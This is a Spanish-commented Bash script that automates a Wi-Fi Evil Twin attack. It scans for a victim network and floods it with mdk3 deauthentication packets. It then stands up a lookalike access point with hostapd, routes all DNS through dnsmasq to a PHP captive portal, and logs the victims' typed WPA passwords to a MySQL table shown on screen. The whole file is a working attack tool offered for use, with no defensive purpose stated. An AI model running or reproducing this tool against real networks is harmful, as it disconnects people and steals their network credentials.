#!/bin/bash
# Herramienta para crear un EvilTwin con portal captivo
# by SebastianV1nces

#Colores
verde="\e[0;32m\033[1m"
sincolor="\033[0m\e[0m"
rojo="\e[0;31m\033[1m"
azul="\e[0;34m\033[1m"
amarillo="\e[0;33m\033[1m"
morado="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
gris="\e[0;37m\033[1m"
negrita="\e[1m"

#Negrita de colores
negrinegra="\033[1;30m"     # Black
negrigris="\033[1;37m"         # Gray
negrirojo="\033[1;31m"       # Red
negriverde="\033[1;32m"     # Green
negriamarillo="\033[1;33m"    # Yellow
negriazul="\033[1;34m·"      # Blue
negrimorado="\033[1;35m"    # Purple
negriceleste="\033[1;36m"      # Cyan
negriblanco="\033[1;37m"     # Bold White

# Lineas de color
subback='\033[4;30m'     # Black
subgris='\033[4;37m'           # Gray
subrojo='\033[4;31m'       # Red
subverde='\033[4;32m'     # Green
subamarillo='\033[4;33m'    # Yellow
subazul='\033[4;34m'      # Blue
submorado='\033[4;35m'    # Purple
subceleste='\033[4;36m'      # Cyan
subblanco='\033[4;37m'     # White

# Background
fondonegro='\033[40m'     # Black
fondored='\033[41m'       # Red
fondoverde='\033[42m'     # Green
fondoamarillo='\033[43m'    # Yellow
fondoazul='\033[44m'      # Blue
fondomorado='\033[45m'    # Purple
fondoceleste='\033[46m'      # Cyan
fondoblanco='\033[47m'     # White



#Funcion de salir con CONTROL + C
trap ctrl_c INT
function ctrl_c(){
	clear
	echo -e "\n${rojo}[*]${sincolor}${negrita}${rojo}  Saliendo del script ${sincolor}${rojo}[*]${sincolor}"
	if systemctl  is-active --quiet  mysql ; then
		echo -e "${negrita}¿Quieres guardar la base de datos?${sincolor}"
		echo -e "\t\n${rojo} 1)${sincolor}${negrita} Guardar${sincolor}"
		echo -e "\t\n${rojo} 2)${sincolor}${negrita} Eliminar${sincolor}"
		echo -ne "\n${negrita} Que quieres hacer >> ${sincolor} " && read opction
		case $opction in
		1)
		echo -e "\n${rojo} [*] Elegiste guardar la base de datos [*] ${sincolor}"
		;;
		2)
		echo -e "\n\t${rojo} [*] Elegiste eliminar la base de datos [*] ${sincolor}"
		mysql -u root -proot -e "use eviltwin; delete from wpa_keys;"
		;;
		*)
		clear
		echo -e "${negrita}Saliendo del script(base de datos guardada por defecto)${sincolor}"
		;;
		esac
	else
		echo ""
	fi
	ifconfig $nic2 down > /dev/null 2>&1
        airmon-ng stop $nic2 > /dev/null 2>&1
        iwconfig $nic2 mode Managed > /dev/null 2>&1
        ifconfig $nic2 up > /dev/null  2>&1
	ifconfig $nic down > /dev/null 2>&1
	airmon-ng stop $nic > /dev/null 2>&1
	iwconfig $nic mode Managed > /dev/null 2>&1
	ifconfig $nic up > /dev/null  2>&1
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	service  mysql stop
	systemctl start NetworkManager > /dev/null
	cd ../..
	rm hostapd.conf > /dev/null 2>&1
	rm dnsmasq.conf > /dev/null 2>&1
	echo -e "\n${verde} Que tengas buen dia  :) ${sincolor}"
	exit 0
}

#modo monitor
function modeMonitor(){
	sleep 1
	clear
	figlet -t -k "Interface" -f Bloody| lolcat -a -d 2
	sleep 1.5
	echo -e "\n\t${negrita}+ Matando todas las conecciones${sincolor}\n"

	#Matando conecciones
	airmon-ng check kill > /dev/null 2>&1
	systemctl stop wpa_supplicant.service > /dev/null 2>&1
	sleep 1

	#interfaces
	contador=1
	for x in $(ifconfig -a | grep -o '^[a-zA-Z0-9]\+'); do
		echo -e "\t${rojo}$contador:${sincolor} ${negrita}$x${sincolor}\n"
		((contador++))
	done
	echo -ne "${morado}\t[*]${sincolor}${verde} ELije el nombre de tu NIC para el ap-falso >> ${sincolor}" && read  nic
	echo -ne "${morado}\n\t[*]${sincolor}${verde} ELije el nombre de tu NIC para el ataque deauth  >> ${sincolor}" && read  nic2

	#Activando modo monitor
	airmon-ng start $nic > /dev/null 2>&1
	sleep 1.5
	echo -e "${negrita}\n\t\t+  Iniciando modo monitor${sincolor}"

	#Verificando el modo monitor del nic
	verificNic=$(iwconfig $nic | grep "Mode" | awk '{print $4}' )
	case $verificNic in
	Mode:Monitor)
	sleep 1.5
	echo -e  "\n\t\t${negrita} + La interfaz ${rojo} $nic ${sincolor}${negrita}esta activa${sincolor}"
	sleep 1
	host
	;;
	*)
	echo -e "${rojo} No se pudo establecer el modo monitor ${sincolor}"
	ifconfig $nic down 2>/dev/null
	airmon-ng stop $nic 2>/dev/null
	iwconfig $nic mode Managed 2>/dev/null
	ifconfig $nic up 2>/dev/null
	systemctl start NetworkManager 2>/dev/null
	exit
	;;
	esac
}

#Archivo hostapd
function host(){
	clear
	figlet -t -k "Hostapd" -f Bloody| lolcat -a -d 3
	sleep 1
	echo -ne "${negrita}\n\t+ Nombre de la red: >> ${sincolor}" && read red
	echo -ne  "${negrita}\n\t+ Canal de la red: >> ${sincolor}"  && read canal
	cd archivos
	echo -e "interface=$nic" > hostapd.conf
	echo -e "driver=nl80211" >> hostapd.conf
	echo -e "ssid=$red" >> hostapd.conf
	echo -e "hw_mode=g" >> hostapd.conf
	echo -e "channel=$canal" >> hostapd.conf
	echo -e "macaddr_acl=0" >> hostapd.conf
	echo -e "auth_algs=1" >> hostapd.conf
	echo -e "ignore_broadcast_ssid=0" >> hostapd.conf
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	chmod +x hostapd.conf
	sleep 2.5
	table
}

#Creando tablas ip
function table(){
	ifconfig $nic up 192.168.1.1 netmask 255.255.255.0
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	clear
	dns
}

#Creando archivo dnsmasq
function dns(){
	echo -e "interface=$nic" > dnsmasq.conf
	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h" >> dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1" >> dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1" >> dnsmasq.conf
	echo -e "server=8.8.8.8" >> dnsmasq.conf
	echo -e "log-queries" >> dnsmasq.conf
	echo -e "log-dhcp" >> dnsmasq.conf
	echo -e "listen-address=127.0.0.1" >> dnsmasq.conf
	echo -e "address=/#/192.168.1.1" >> dnsmasq.conf
	sleep 1.5
	figlet -t -k "DHCP - PHP" -f Bloody | lolcat -a -d 2
	sleep 1.5
	echo -e "\n\t${negrita} [+] Generando  archivo dnsmasq  jugando a las configuraciones \n\t      de red para el servidor dhcp${sincolor}"
	sleep 1.5
	echo  -e "\n\t${negrita} [+] Iniciando servidor PHP en xterm${sincolor}\n"
	chmod +x dnsmasq.conf
	sleep 0.6
	clear
	interface
}

function interface () {
	figlet -t -k "Victima" -f Bloody | lolcat -a -d 3 
	sleep 1.5
	airodump-ng $nic
	echo -ne "\n\t${morado}[*]${sincolor}${negrita} Direccion mac de la red victima>>  ${sincolor}${sincolor}" && read mac1
	sleep 1.5
	echo -ne 1"\n\t${morado}[*]${sincolor}${negrita} Canal de la red victima>>   ${sincolor}" && read channel
	airodump-ng --bssid $mac1 --channel $channel $nic
	start
}


function start() {
#	airmon-ng check kill
	airmon-ng start $nic2 $channel  > /dev/null 2>&1
	xterm -geometry 80x10+400+100  -T "Deauth" -e "mdk3 $nic2 d -B $mac1 -c $channel & tcpdump -i wlan1 -n 'subtype deauth and type mgt'" &
	sleep 1
	xterm -geometry 60x20+950+450 -T "Point Access Hostapd" -e "hostapd hostapd.conf ; bash" &
	sleep 1
	xterm -geometry 70x20+900+100 -T "DHCP" -e "dnsmasq -C dnsmasq.conf -d " &
	sleep 1
	cd portal
	xterm -geometry 70x20+500+450 -T "Server PHP" -e "php -S '192.168.1.1:80'" &
	sql
}

function sql(){
	clear
	service mysql start
	#variables para la base de datos
	usersql="root"
	password="root"
	dbname="eviltwin"
	tbl_name="wpa_keys"
	atributo1="password1"
	atributo2="password2"
	comando="CREATE DATABASE IF NOT EXISTS $dbname ; USE $dbname ; CREATE TABLE IF NOT EXISTS $tbl_name ($atributo1 varchar(20), $atributo2 varchar(20));"
	#creacion de la base de datos
	service mysql start
	mysql -u $usersql -p"$password" -e "$comando"
	#contraseñas en pantalla
	while true
	do
		figlet -t -k "Mysql" -f Bloody| lolcat -a -d 3
		echo -e "\t${negrita}COntraseñas capturadas${sincolor}\n"
		mysqldump -u root  -proot eviltwin wpa_keys > keys.txt
		cat keys.txt | grep -Ei "\('[^']+','[^']+'\)"
		 tput cnorm
		sleep 20 && clear
	done
}

#dependencias
function dependecias(){
	clear
	figlet -t -k "Dependencias" -f Bloody| lolcat -a -d 2
	echo -e "\n  ${morado}[*]${sincolor}${negrita} Verificando dependencias${sincolor}${morado} [*]${sincolor}\n"
	sleep 1
	counter=0
	dependencias=(php dnsmasq hostapd mysql aircrack-ng xterm mysqldump figlet lolcat)
	for programa in "${dependencias[@]}"; do
        if [ "$(command -v $programa)" ]; then
		sleep 1.2
                echo -e "${negrita}La dependencia ${verde}$programa${sincolor} esta instalada${sincolor}"
		let counter+=1
        else
                echo -e "${negrita}La dependecia ${rojo}$programa${sincolor} no esta instalada${sincolor}"
        fi
	done
	if [ "$(echo "$counter")" == "9" ]; then
		echo -e  "\n\t ${verde} Comenzando el script ${sincolor}"
	else
		echo -e "\n\t ${rojo} Instala las dependencias que te faltan ${sincolor}"
		exit 1
	fi
}

function banner(){
	clear
	figlet -c -f ANSI_Shadow  "Give me your Password" | lolcat -a -d 5 -s 100 2>/dev/null
echo -e "	\t\t${negrita}${azul}.............." | lolcat
echo -e "	\t\t\t${negrita}${azul}..,;:ccc,. " | lolcat
echo -e "	\t\t\t${negrita}${azul}......''';lxO."| lolcat
echo -e "	\t\t${negrita}${azul}.....''''..........,:ld;"| lolcat
echo -e "	   \t\t\t${negrita}${azul}.';;;:::;,,.x,                               by SebastianV1nces" | lolcat -a 
echo -e "	\t\t${negrita}${azul}      ..'''.            0Xxoc:,.  ..."| lolcat
echo -e "	\t\t${negrita}${azul}  ....                ,ONkc;,;cokOdc',."| lolcat
echo -e "	\t\t${negrita}${azul} .                   OMo           ':ddo.        Github: ${negrita}https://github.com/SebastinV1nces ${sincolor} " | lolcat
echo -e "	\t\t${negrita}${azul}                    dMc               :OO;       Instagran: ${sincolor}${negrita}https://www.instagram.com/SebastianV1nces "| lolcat
echo -e "	\t\t${negrita}${azul}                    0M.                 .:o." | lolcat
echo -e "	\t\t${negrita}${azul}                    ;Wd"| lolcat
echo -e "	\t\t${negrita}${azul}                    ;XO,"| lolcat
echo -e "	\t\t${negrita}${azul}                       ,d0Odlc;,.."| lolcat
echo -e "	\t\t${negrita}${azul}                           ..',;:cdOOd::,."| lolcat
echo -e "	\t\t${negrita}${azul}                                    .:d;.':;."| lolcat
echo -e "	\t\t${negrita}${azul}                                       'd,  .'"| lolcat
echo -e "	\t\t${negrita}${azul}                                         ;l   .."| lolcat
echo -e "	\t\t${negrita}${azul}                                          .o"| lolcat
echo -e "	\t\t${negrita}${azul}                                            c"| lolcat
echo -ne "	\t\t${negrita}${azul}                                            .'"| lolcat
sleep 3
}

#por aqui este lado se inicia el script
#verificando si se ejecuta con el usuario root

if [ "$(id -u)" == "0" ]; then
	banner
	dependecias
	modeMonitor
else
        echo -e "${morado}[*]${sincolor}${negrita} Inicia como ${sincolor}${rojo}root${sincolor}${morado} [*]${sincolor}"
        exit 1
fi
